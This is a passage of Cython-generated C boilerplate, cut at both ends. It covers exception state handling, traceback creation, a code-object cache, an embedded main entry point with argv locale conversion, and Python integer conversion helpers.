    *type = 0;
    *value = 0;
    *tb = 0;
    Py_XDECREF(local_type);
    Py_XDECREF(local_value);
    Py_XDECREF(local_tb);
    return -1;
}

/* PyErrFetchRestore */
#if CYTHON_FAST_THREAD_STATE
static CYTHON_INLINE void __Pyx_ErrRestoreInState(PyThreadState *tstate, PyObject *type, PyObject *value, PyObject *tb) {
    PyObject *tmp_type, *tmp_value, *tmp_tb;
    tmp_type = tstate->curexc_type;
    tmp_value = tstate->curexc_value;
    tmp_tb = tstate->curexc_traceback;
    tstate->curexc_type = type;
    tstate->curexc_value = value;
    tstate->curexc_traceback = tb;
    Py_XDECREF(tmp_type);
    Py_XDECREF(tmp_value);
    Py_XDECREF(tmp_tb);
}
static CYTHON_INLINE void __Pyx_ErrFetchInState(PyThreadState *tstate, PyObject **type, PyObject **value, PyObject **tb) {
    *type = tstate->curexc_type;
    *value = tstate->curexc_value;
    *tb = tstate->curexc_traceback;
    tstate->curexc_type = 0;
    tstate->curexc_value = 0;
    tstate->curexc_traceback = 0;
}
#endif

/* CLineInTraceback */
#ifndef CYTHON_CLINE_IN_TRACEBACK
static int __Pyx_CLineForTraceback(CYTHON_UNUSED PyThreadState *tstate, int c_line) {
    PyObject *use_cline;
    PyObject *ptype, *pvalue, *ptraceback;
#if CYTHON_COMPILING_IN_CPYTHON
    PyObject **cython_runtime_dict;
#endif
    if (unlikely(!__pyx_cython_runtime)) {
        return c_line;
    }
    __Pyx_ErrFetchInState(tstate, &ptype, &pvalue, &ptraceback);
#if CYTHON_COMPILING_IN_CPYTHON
    cython_runtime_dict = _PyObject_GetDictPtr(__pyx_cython_runtime);
    if (likely(cython_runtime_dict)) {
        __PYX_PY_DICT_LOOKUP_IF_MODIFIED(
            use_cline, *cython_runtime_dict,
            __Pyx_PyDict_GetItemStr(*cython_runtime_dict, __pyx_n_s_cline_in_traceback))
    } else
#endif
    {
      PyObject *use_cline_obj = __Pyx_PyObject_GetAttrStr(__pyx_cython_runtime, __pyx_n_s_cline_in_traceback);
      if (use_cline_obj) {
        use_cline = PyObject_Not(use_cline_obj) ? Py_False : Py_True;
        Py_DECREF(use_cline_obj);
      } else {
        PyErr_Clear();
        use_cline = NULL;
      }
    }
    if (!use_cline) {
        c_line = 0;
        (void) PyObject_SetAttr(__pyx_cython_runtime, __pyx_n_s_cline_in_traceback, Py_False);
    }
    else if (use_cline == Py_False || (use_cline != Py_True && PyObject_Not(use_cline) != 0)) {
        c_line = 0;
    }
    __Pyx_ErrRestoreInState(tstate, ptype, pvalue, ptraceback);
    return c_line;
}
#endif

/* CodeObjectCache */
static int __pyx_bisect_code_objects(__Pyx_CodeObjectCacheEntry* entries, int count, int code_line) {
    int start = 0, mid = 0, end = count - 1;
    if (end >= 0 && code_line > entries[end].code_line) {
        return count;
    }
    while (start < end) {
        mid = start + (end - start) / 2;
        if (code_line < entries[mid].code_line) {
            end = mid;
        } else if (code_line > entries[mid].code_line) {
             start = mid + 1;
        } else {
            return mid;
        }
    }
    if (code_line <= entries[mid].code_line) {
        return mid;
    } else {
        return mid + 1;
    }
}
static PyCodeObject *__pyx_find_code_object(int code_line) {
    PyCodeObject* code_object;
    int pos;
    if (unlikely(!code_line) || unlikely(!__pyx_code_cache.entries)) {
        return NULL;
    }
    pos = __pyx_bisect_code_objects(__pyx_code_cache.entries, __pyx_code_cache.count, code_line);
    if (unlikely(pos >= __pyx_code_cache.count) || unlikely(__pyx_code_cache.entries[pos].code_line != code_line)) {
        return NULL;
    }
    code_object = __pyx_code_cache.entries[pos].code_object;
    Py_INCREF(code_object);
    return code_object;
}
static void __pyx_insert_code_object(int code_line, PyCodeObject* code_object) {
    int pos, i;
    __Pyx_CodeObjectCacheEntry* entries = __pyx_code_cache.entries;
    if (unlikely(!code_line)) {
        return;
    }
    if (unlikely(!entries)) {
        entries = (__Pyx_CodeObjectCacheEntry*)PyMem_Malloc(64*sizeof(__Pyx_CodeObjectCacheEntry));
        if (likely(entries)) {
            __pyx_code_cache.entries = entries;
            __pyx_code_cache.max_count = 64;
            __pyx_code_cache.count = 1;
            entries[0].code_line = code_line;
            entries[0].code_object = code_object;
            Py_INCREF(code_object);
        }
        return;
    }
    pos = __pyx_bisect_code_objects(__pyx_code_cache.entries, __pyx_code_cache.count, code_line);
    if ((pos < __pyx_code_cache.count) && unlikely(__pyx_code_cache.entries[pos].code_line == code_line)) {
        PyCodeObject* tmp = entries[pos].code_object;
        entries[pos].code_object = code_object;
        Py_DECREF(tmp);
        return;
    }
    if (__pyx_code_cache.count == __pyx_code_cache.max_count) {
        int new_max = __pyx_code_cache.max_count + 64;
        entries = (__Pyx_CodeObjectCacheEntry*)PyMem_Realloc(
            __pyx_code_cache.entries, ((size_t)new_max) * sizeof(__Pyx_CodeObjectCacheEntry));
        if (unlikely(!entries)) {
            return;
        }
        __pyx_code_cache.entries = entries;
        __pyx_code_cache.max_count = new_max;
    }
    for (i=__pyx_code_cache.count; i>pos; i--) {
        entries[i] = entries[i-1];
    }
    entries[pos].code_line = code_line;
    entries[pos].code_object = code_object;
    __pyx_code_cache.count++;
    Py_INCREF(code_object);
}

/* AddTraceback */
#include "compile.h"
#include "frameobject.h"
#include "traceback.h"
#if PY_VERSION_HEX >= 0x030b00a6
  #ifndef Py_BUILD_CORE
    #define Py_BUILD_CORE 1
  #endif
  #include "internal/pycore_frame.h"
#endif
static PyCodeObject* __Pyx_CreateCodeObjectForTraceback(
            const char *funcname, int c_line,
            int py_line, const char *filename) {
    PyCodeObject *py_code = NULL;
    PyObject *py_funcname = NULL;
    #if PY_MAJOR_VERSION < 3
    PyObject *py_srcfile = NULL;
    py_srcfile = PyString_FromString(filename);
    if (!py_srcfile) goto bad;
    #endif
    if (c_line) {
        #if PY_MAJOR_VERSION < 3
        py_funcname = PyString_FromFormat( "%s (%s:%d)", funcname, __pyx_cfilenm, c_line);
        if (!py_funcname) goto bad;
        #else
        py_funcname = PyUnicode_FromFormat( "%s (%s:%d)", funcname, __pyx_cfilenm, c_line);
        if (!py_funcname) goto bad;
        funcname = PyUnicode_AsUTF8(py_funcname);
        if (!funcname) goto bad;
        #endif
    }
    else {
        #if PY_MAJOR_VERSION < 3
        py_funcname = PyString_FromString(funcname);
        if (!py_funcname) goto bad;
        #endif
    }
    #if PY_MAJOR_VERSION < 3
    py_code = __Pyx_PyCode_New(
        0,
        0,
        0,
        0,
        0,
        __pyx_empty_bytes, /*PyObject *code,*/
        __pyx_empty_tuple, /*PyObject *consts,*/
        __pyx_empty_tuple, /*PyObject *names,*/
        __pyx_empty_tuple, /*PyObject *varnames,*/
        __pyx_empty_tuple, /*PyObject *freevars,*/
        __pyx_empty_tuple, /*PyObject *cellvars,*/
        py_srcfile,   /*PyObject *filename,*/
        py_funcname,  /*PyObject *name,*/
        py_line,
        __pyx_empty_bytes  /*PyObject *lnotab*/
    );
    Py_DECREF(py_srcfile);
    #else
    py_code = PyCode_NewEmpty(filename, funcname, py_line);
    #endif
    Py_XDECREF(py_funcname);  // XDECREF since it's only set on Py3 if cline
    return py_code;
bad:
    Py_XDECREF(py_funcname);
    #if PY_MAJOR_VERSION < 3
    Py_XDECREF(py_srcfile);
    #endif
    return NULL;
}
static void __Pyx_AddTraceback(const char *funcname, int c_line,
                               int py_line, const char *filename) {
    PyCodeObject *py_code = 0;
    PyFrameObject *py_frame = 0;
    PyThreadState *tstate = __Pyx_PyThreadState_Current;
    PyObject *ptype, *pvalue, *ptraceback;
    if (c_line) {
        c_line = __Pyx_CLineForTraceback(tstate, c_line);
    }
    py_code = __pyx_find_code_object(c_line ? -c_line : py_line);
    if (!py_code) {
        __Pyx_ErrFetchInState(tstate, &ptype, &pvalue, &ptraceback);
        py_code = __Pyx_CreateCodeObjectForTraceback(
            funcname, c_line, py_line, filename);
        if (!py_code) {
            /* If the code object creation fails, then we should clear the
               fetched exception references and propagate the new exception */
            Py_XDECREF(ptype);
            Py_XDECREF(pvalue);
            Py_XDECREF(ptraceback);
            goto bad;
        }
        __Pyx_ErrRestoreInState(tstate, ptype, pvalue, ptraceback);
        __pyx_insert_code_object(c_line ? -c_line : py_line, py_code);
    }
    py_frame = PyFrame_New(
        tstate,            /*PyThreadState *tstate,*/
        py_code,           /*PyCodeObject *code,*/
        __pyx_d,    /*PyObject *globals,*/
        0                  /*PyObject *locals*/
    );
    if (!py_frame) goto bad;
    __Pyx_PyFrame_SetLineNumber(py_frame, py_line);
    PyTraceBack_Here(py_frame);
bad:
    Py_XDECREF(py_code);
    Py_XDECREF(py_frame);
}

/* MainFunction */
#ifdef __FreeBSD__
#include <floatingpoint.h>
#endif
#if PY_MAJOR_VERSION < 3
int main(int argc, char** argv) {
#elif defined(WIN32) || defined(MS_WINDOWS)
int wmain(int argc, wchar_t **argv) {
#else
static int __Pyx_main(int argc, wchar_t **argv) {
#endif
    /* 754 requires that FP exceptions run in "no stop" mode by default,
     * and until C vendors implement C99's ways to control FP exceptions,
     * Python requires non-stop mode.  Alas, some platforms enable FP
     * exceptions by default.  Here we disable them.
     */
#ifdef __FreeBSD__
    fp_except_t m;
    m = fpgetmask();
    fpsetmask(m & ~FP_X_OFL);
#endif
    if (argc && argv)
        Py_SetProgramName(argv[0]);
    Py_Initialize();
    if (argc && argv)
        PySys_SetArgv(argc, argv);
    {
      PyObject* m = NULL;
      __pyx_module_is_main_source = 1;
      #if PY_MAJOR_VERSION < 3
          initsource();
      #elif CYTHON_PEP489_MULTI_PHASE_INIT
          m = PyInit_source();
          if (!PyModule_Check(m)) {
              PyModuleDef *mdef = (PyModuleDef *) m;
              PyObject *modname = PyUnicode_FromString("__main__");
              m = NULL;
              if (modname) {
                  m = PyModule_NewObject(modname);
                  Py_DECREF(modname);
                  if (m) PyModule_ExecDef(m, mdef);
              }
          }
      #else
          m = PyInit_source();
      #endif
      if (PyErr_Occurred()) {
          PyErr_Print();
          #if PY_MAJOR_VERSION < 3
          if (Py_FlushLine()) PyErr_Clear();
          #endif
          return 1;
      }
      Py_XDECREF(m);
    }
#if PY_VERSION_HEX < 0x03060000
    Py_Finalize();
#else
    if (Py_FinalizeEx() < 0)
        return 2;
#endif
    return 0;
}
#if PY_MAJOR_VERSION >= 3 && !defined(WIN32) && !defined(MS_WINDOWS)
#include <locale.h>
static wchar_t*
__Pyx_char2wchar(char* arg)
{
    wchar_t *res;
#ifdef HAVE_BROKEN_MBSTOWCS
    /* Some platforms have a broken implementation of
     * mbstowcs which does not count the characters that
     * would result from conversion.  Use an upper bound.
     */
    size_t argsize = strlen(arg);
#else
    size_t argsize = mbstowcs(NULL, arg, 0);
#endif
    size_t count;
    unsigned char *in;
    wchar_t *out;
#ifdef HAVE_MBRTOWC
    mbstate_t mbs;
#endif
    if (argsize != (size_t)-1) {
        res = (wchar_t *)malloc((argsize+1)*sizeof(wchar_t));
        if (!res)
            goto oom;
        count = mbstowcs(res, arg, argsize+1);
        if (count != (size_t)-1) {
            wchar_t *tmp;
            /* Only use the result if it contains no
               surrogate characters. */
            for (tmp = res; *tmp != 0 &&
                     (*tmp < 0xd800 || *tmp > 0xdfff); tmp++)
                ;
            if (*tmp == 0)
                return res;
        }
        free(res);
    }
#ifdef HAVE_MBRTOWC
    /* Overallocate; as multi-byte characters are in the argument, the
       actual output could use less memory. */
    argsize = strlen(arg) + 1;
    res = (wchar_t *)malloc(argsize*sizeof(wchar_t));
    if (!res) goto oom;
    in = (unsigned char*)arg;
    out = res;
    memset(&mbs, 0, sizeof mbs);
    while (argsize) {
        size_t converted = mbrtowc(out, (char*)in, argsize, &mbs);
        if (converted == 0)
            break;
        if (converted == (size_t)-2) {
            /* Incomplete character. This should never happen,
               since we provide everything that we have -
               unless there is a bug in the C library, or I
               misunderstood how mbrtowc works. */
            fprintf(stderr, "unexpected mbrtowc result -2\\n");
            free(res);
            return NULL;
        }
        if (converted == (size_t)-1) {
            /* Conversion error. Escape as UTF-8b, and start over
               in the initial shift state. */
            *out++ = 0xdc00 + *in++;
            argsize--;
            memset(&mbs, 0, sizeof mbs);
            continue;
        }
        if (*out >= 0xd800 && *out <= 0xdfff) {
            /* Surrogate character.  Escape the original
               byte sequence with surrogateescape. */
            argsize -= converted;
            while (converted--)
                *out++ = 0xdc00 + *in++;
            continue;
        }
        in += converted;
        argsize -= converted;
        out++;
    }
#else
    /* Cannot use C locale for escaping; manually escape as if charset
       is ASCII (i.e. escape all bytes > 128. This will still roundtrip
       correctly in the locale's charset, which must be an ASCII superset. */
    res = (wchar_t *)malloc((strlen(arg)+1)*sizeof(wchar_t));
    if (!res) goto oom;
    in = (unsigned char*)arg;
    out = res;
    while(*in)
        if(*in < 128)
            *out++ = *in++;
        else
            *out++ = 0xdc00 + *in++;
    *out = 0;
#endif
    return res;
oom:
    fprintf(stderr, "out of memory\\n");
    return NULL;
}
int
main(int argc, char **argv)
{
    if (!argc) {
        return __Pyx_main(0, NULL);
    }
    else {
        int i, res;
        wchar_t **argv_copy = (wchar_t **)malloc(sizeof(wchar_t*)*argc);
        wchar_t **argv_copy2 = (wchar_t **)malloc(sizeof(wchar_t*)*argc);
        char *oldloc = strdup(setlocale(LC_ALL, NULL));
        if (!argv_copy || !argv_copy2 || !oldloc) {
            fprintf(stderr, "out of memory\\n");
            free(argv_copy);
            free(argv_copy2);
            free(oldloc);
            return 1;
        }
        res = 0;
        setlocale(LC_ALL, "");
        for (i = 0; i < argc; i++) {
            argv_copy2[i] = argv_copy[i] = __Pyx_char2wchar(argv[i]);
            if (!argv_copy[i]) res = 1;
        }
        setlocale(LC_ALL, oldloc);
        free(oldloc);
        if (res == 0)
            res = __Pyx_main(argc, argv_copy);
        for (i = 0; i < argc; i++) {
#if PY_VERSION_HEX < 0x03050000
            free(argv_copy2[i]);
#else
            PyMem_RawFree(argv_copy2[i]);
#endif
        }
        free(argv_copy);
        free(argv_copy2);
        return res;
    }
}
#endif

/* CIntToPy */
    static CYTHON_INLINE PyObject* __Pyx_PyInt_From_long(long value) {
#ifdef __Pyx_HAS_GCC_DIAGNOSTIC
#pragma GCC diagnostic push
#pragma GCC diagnostic ignored "-Wconversion"
#endif
    const long neg_one = (long) -1, const_zero = (long) 0;
#ifdef __Pyx_HAS_GCC_DIAGNOSTIC
#pragma GCC diagnostic pop
#endif
    const int is_unsigned = neg_one > const_zero;
    if (is_unsigned) {
        if (sizeof(long) < sizeof(long)) {
            return PyInt_FromLong((long) value);
        } else if (sizeof(long) <= sizeof(unsigned long)) {
            return PyLong_FromUnsignedLong((unsigned long) value);
#ifdef HAVE_LONG_LONG
        } else if (sizeof(long) <= sizeof(unsigned PY_LONG_LONG)) {
            return PyLong_FromUnsignedLongLong((unsigned PY_LONG_LONG) value);
#endif
        }
    } else {
        if (sizeof(long) <= sizeof(long)) {
            return PyInt_FromLong((long) value);
#ifdef HAVE_LONG_LONG
        } else if (sizeof(long) <= sizeof(PY_LONG_LONG)) {
            return PyLong_FromLongLong((PY_LONG_LONG) value);
#endif
        }
    }
    {
        int one = 1; int little = (int)*(unsigned char *)&one;
        unsigned char *bytes = (unsigned char *)&value;
        return _PyLong_FromByteArray(bytes, sizeof(long),
                                     little, !is_unsigned);
    }
}

/* CIntFromPyVerify */
    #define __PYX_VERIFY_RETURN_INT(target_type, func_type, func_value)\
    __PYX__VERIFY_RETURN_INT(target_type, func_type, func_value, 0)
#define __PYX_VERIFY_RETURN_INT_EXC(target_type, func_type, func_value)\
    __PYX__VERIFY_RETURN_INT(target_type, func_type, func_value, 1)
#define __PYX__VERIFY_RETURN_INT(target_type, func_type, func_value, exc)\
    {\
        func_type value = func_value;\
        if (sizeof(target_type) < sizeof(func_type)) {\
            if (unlikely(value != (func_type) (target_type) value)) {\
                func_type zero = 0;\
                if (exc && unlikely(value == (func_type)-1 && PyErr_Occurred()))\
                    return (target_type) -1;\
                if (is_unsigned && unlikely(value < zero))\
                    goto raise_neg_overflow;\
                else\
                    goto raise_overflow;\
            }\
        }\
        return (target_type) value;\
    }

/* CIntFromPy */
    static CYTHON_INLINE long __Pyx_PyInt_As_long(PyObject *x) {
#ifdef __Pyx_HAS_GCC_DIAGNOSTIC
#pragma GCC diagnostic push
#pragma GCC diagnostic ignored "-Wconversion"
#endif
    const long neg_one = (long) -1, const_zero = (long) 0;
#ifdef __Pyx_HAS_GCC_DIAGNOSTIC
#pragma GCC diagnostic pop
#endif
    const int is_unsigned = neg_one > const_zero;
#if PY_MAJOR_VERSION < 3
    if (likely(PyInt_Check(x))) {
        if (sizeof(long) < sizeof(long)) {
            __PYX_VERIFY_RETURN_INT(long, long, PyInt_AS_LONG(x))
        } else {
            long val = PyInt_AS_LONG(x);
            if (is_unsigned && unlikely(val < 0)) {
                goto raise_neg_overflow;
            }
            return (long) val;
        }
    } else
#endif
    if (likely(PyLong_Check(x))) {
        if (is_unsigned) {
#if CYTHON_USE_PYLONG_INTERNALS
            const digit* digits = ((PyLongObject*)x)->ob_digit;
            switch (Py_SIZE(x)) {
                case  0: return (long) 0;
                case  1: __PYX_VERIFY_RETURN_INT(long, digit, digits[0])
                case 2:
                    if (8 * sizeof(long) > 1 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 2 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(long, unsigned long, (((((unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(long) >= 2 * PyLong_SHIFT) {
                            return (long) (((((long)digits[1]) << PyLong_SHIFT) | (long)digits[0]));
                        }
                    }
                    break;
                case 3:
                    if (8 * sizeof(long) > 2 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 3 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(long, unsigned long, (((((((unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(long) >= 3 * PyLong_SHIFT) {
                            return (long) (((((((long)digits[2]) << PyLong_SHIFT) | (long)digits[1]) << PyLong_SHIFT) | (long)digits[0]));
                        }
                    }
                    break;
                case 4:
                    if (8 * sizeof(long) > 3 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 4 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(long, unsigned long, (((((((((unsigned long)digits[3]) << PyLong_SHIFT) | (unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(long) >= 4 * PyLong_SHIFT) {
                            return (long) (((((((((long)digits[3]) << PyLong_SHIFT) | (long)digits[2]) << PyLong_SHIFT) | (long)digits[1]) << PyLong_SHIFT) | (long)digits[0]));
                        }
                    }
                    break;
            }
#endif
#if CYTHON_COMPILING_IN_CPYTHON
            if (unlikely(Py_SIZE(x) < 0)) {
                goto raise_neg_overflow;
            }
#else
            {
                int result = PyObject_RichCompareBool(x, Py_False, Py_LT);
                if (unlikely(result < 0))
                    return (long) -1;
                if (unlikely(result == 1))
                    goto raise_neg_overflow;
            }
#endif
            if (sizeof(long) <= sizeof(unsigned long)) {
                __PYX_VERIFY_RETURN_INT_EXC(long, unsigned long, PyLong_AsUnsignedLong(x))
#ifdef HAVE_LONG_LONG
            } else if (sizeof(long) <= sizeof(unsigned PY_LONG_LONG)) {
                __PYX_VERIFY_RETURN_INT_EXC(long, unsigned PY_LONG_LONG, PyLong_AsUnsignedLongLong(x))
#endif
            }
        } else {
#if CYTHON_USE_PYLONG_INTERNALS
            const digit* digits = ((PyLongObject*)x)->ob_digit;
            switch (Py_SIZE(x)) {
                case  0: return (long) 0;
                case -1: __PYX_VERIFY_RETURN_INT(long, sdigit, (sdigit) (-(sdigit)digits[0]))
                case  1: __PYX_VERIFY_RETURN_INT(long,  digit, +digits[0])
                case -2:
                    if (8 * sizeof(long) - 1 > 1 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 2 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(long, long, -(long) (((((unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(long) - 1 > 2 * PyLong_SHIFT) {
                            return (long) (((long)-1)*(((((long)digits[1]) << PyLong_SHIFT) | (long)digits[0])));
                        }
                    }
                    break;
                case 2:
                    if (8 * sizeof(long) > 1 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 2 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(long, unsigned long, (((((unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(long) - 1 > 2 * PyLong_SHIFT) {
                            return (long) ((((((long)digits[1]) << PyLong_SHIFT) | (long)digits[0])));
                        }
                    }
                    break;
                case -3:
                    if (8 * sizeof(long) - 1 > 2 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 3 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(long, long, -(long) (((((((unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(long) - 1 > 3 * PyLong_SHIFT) {
                            return (long) (((long)-1)*(((((((long)digits[2]) << PyLong_SHIFT) | (long)digits[1]) << PyLong_SHIFT) | (long)digits[0])));
                        }
                    }
                    break;
                case 3:
                    if (8 * sizeof(long) > 2 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 3 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(long, unsigned long, (((((((unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(long) - 1 > 3 * PyLong_SHIFT) {
                            return (long) ((((((((long)digits[2]) << PyLong_SHIFT) | (long)digits[1]) << PyLong_SHIFT) | (long)digits[0])));
                        }
                    }
                    break;
                case -4:
                    if (8 * sizeof(long) - 1 > 3 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 4 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(long, long, -(long) (((((((((unsigned long)digits[3]) << PyLong_SHIFT) | (unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(long) - 1 > 4 * PyLong_SHIFT) {
                            return (long) (((long)-1)*(((((((((long)digits[3]) << PyLong_SHIFT) | (long)digits[2]) << PyLong_SHIFT) | (long)digits[1]) << PyLong_SHIFT) | (long)digits[0])));
                        }
                    }
                    break;
                case 4:
                    if (8 * sizeof(long) > 3 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 4 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(long, unsigned long, (((((((((unsigned long)digits[3]) << PyLong_SHIFT) | (unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(long) - 1 > 4 * PyLong_SHIFT) {
                            return (long) ((((((((((long)digits[3]) << PyLong_SHIFT) | (long)digits[2]) << PyLong_SHIFT) | (long)digits[1]) << PyLong_SHIFT) | (long)digits[0])));
                        }
                    }
                    break;
            }
#endif
            if (sizeof(long) <= sizeof(long)) {
                __PYX_VERIFY_RETURN_INT_EXC(long, long, PyLong_AsLong(x))
#ifdef HAVE_LONG_LONG
            } else if (sizeof(long) <= sizeof(PY_LONG_LONG)) {
                __PYX_VERIFY_RETURN_INT_EXC(long, PY_LONG_LONG, PyLong_AsLongLong(x))
#endif
            }
        }
        {
#if CYTHON_COMPILING_IN_PYPY && !defined(_PyLong_AsByteArray)
            PyErr_SetString(PyExc_RuntimeError,
                            "_PyLong_AsByteArray() not available in PyPy, cannot convert large numbers");
#else
            long val;
            PyObject *v = __Pyx_PyNumber_IntOrLong(x);
 #if PY_MAJOR_VERSION < 3
            if (likely(v) && !PyLong_Check(v)) {
                PyObject *tmp = v;
                v = PyNumber_Long(tmp);
                Py_DECREF(tmp);
            }
 #endif
            if (likely(v)) {
                int one = 1; int is_little = (int)*(unsigned char *)&one;
                unsigned char *bytes = (unsigned char *)&val;
                int ret = _PyLong_AsByteArray((PyLongObject *)v,
                                              bytes, sizeof(val),
                                              is_little, !is_unsigned);
                Py_DECREF(v);
                if (likely(!ret))
                    return val;
            }
#endif
            return (long) -1;
        }
    } else {
        long val;
        PyObject *tmp = __Pyx_PyNumber_IntOrLong(x);
        if (!tmp) return (long) -1;
        val = __Pyx_PyInt_As_long(tmp);
        Py_DECREF(tmp);
        return val;
    }
raise_overflow:
    PyErr_SetString(PyExc_OverflowError,
        "value too large to convert to long");
    return (long) -1;
raise_neg_overflow:
    PyErr_SetString(PyExc_OverflowError,
        "can't convert negative value to long");
    return (long) -1;
}

/* CIntFromPy */
    static CYTHON_INLINE int __Pyx_PyInt_As_int(PyObject *x) {
#ifdef __Pyx_HAS_GCC_DIAGNOSTIC
#pragma GCC diagnostic push
#pragma GCC diagnostic ignored "-Wconversion"
#endif
    const int neg_one = (int) -1, const_zero = (int) 0;
#ifdef __Pyx_HAS_GCC_DIAGNOSTIC
#pragma GCC diagnostic pop
#endif
    const int is_unsigned = neg_one > const_zero;
#if PY_MAJOR_VERSION < 3
    if (likely(PyInt_Check(x))) {
        if (sizeof(int) < sizeof(long)) {
            __PYX_VERIFY_RETURN_INT(int, long, PyInt_AS_LONG(x))
        } else {
            long val = PyInt_AS_LONG(x);
            if (is_unsigned && unlikely(val < 0)) {
                goto raise_neg_overflow;
            }
            return (int) val;
        }
    } else
#endif
    if (likely(PyLong_Check(x))) {
        if (is_unsigned) {
#if CYTHON_USE_PYLONG_INTERNALS
            const digit* digits = ((PyLongObject*)x)->ob_digit;
            switch (Py_SIZE(x)) {
                case  0: return (int) 0;
                case  1: __PYX_VERIFY_RETURN_INT(int, digit, digits[0])
                case 2:
                    if (8 * sizeof(int) > 1 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 2 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(int, unsigned long, (((((unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(int) >= 2 * PyLong_SHIFT) {
                            return (int) (((((int)digits[1]) << PyLong_SHIFT) | (int)digits[0]));
                        }
                    }
                    break;
                case 3:
                    if (8 * sizeof(int) > 2 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 3 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(int, unsigned long, (((((((unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(int) >= 3 * PyLong_SHIFT) {
                            return (int) (((((((int)digits[2]) << PyLong_SHIFT) | (int)digits[1]) << PyLong_SHIFT) | (int)digits[0]));
                        }
                    }
                    break;
                case 4:
                    if (8 * sizeof(int) > 3 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 4 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(int, unsigned long, (((((((((unsigned long)digits[3]) << PyLong_SHIFT) | (unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(int) >= 4 * PyLong_SHIFT) {
                            return (int) (((((((((int)digits[3]) << PyLong_SHIFT) | (int)digits[2]) << PyLong_SHIFT) | (int)digits[1]) << PyLong_SHIFT) | (int)digits[0]));
                        }
                    }
                    break;
            }
#endif
#if CYTHON_COMPILING_IN_CPYTHON
            if (unlikely(Py_SIZE(x) < 0)) {
                goto raise_neg_overflow;
            }
#else
            {
                int result = PyObject_RichCompareBool(x, Py_False, Py_LT);
                if (unlikely(result < 0))
                    return (int) -1;
                if (unlikely(result == 1))
                    goto raise_neg_overflow;
            }
#endif
            if (sizeof(int) <= sizeof(unsigned long)) {
                __PYX_VERIFY_RETURN_INT_EXC(int, unsigned long, PyLong_AsUnsignedLong(x))
#ifdef HAVE_LONG_LONG
            } else if (sizeof(int) <= sizeof(unsigned PY_LONG_LONG)) {
                __PYX_VERIFY_RETURN_INT_EXC(int, unsigned PY_LONG_LONG, PyLong_AsUnsignedLongLong(x))
#endif
            }
        } else {
#if CYTHON_USE_PYLONG_INTERNALS
            const digit* digits = ((PyLongObject*)x)->ob_digit;
            switch (Py_SIZE(x)) {
                case  0: return (int) 0;
                case -1: __PYX_VERIFY_RETURN_INT(int, sdigit, (sdigit) (-(sdigit)digits[0]))
                case  1: __PYX_VERIFY_RETURN_INT(int,  digit, +digits[0])
                case -2:
                    if (8 * sizeof(int) - 1 > 1 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 2 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(int, long, -(long) (((((unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(int) - 1 > 2 * PyLong_SHIFT) {
                            return (int) (((int)-1)*(((((int)digits[1]) << PyLong_SHIFT) | (int)digits[0])));
                        }
                    }
                    break;
                case 2:
                    if (8 * sizeof(int) > 1 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 2 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(int, unsigned long, (((((unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(int) - 1 > 2 * PyLong_SHIFT) {
                            return (int) ((((((int)digits[1]) << PyLong_SHIFT) | (int)digits[0])));
                        }
                    }
                    break;
                case -3:
                    if (8 * sizeof(int) - 1 > 2 * PyLong_SHIFT) {
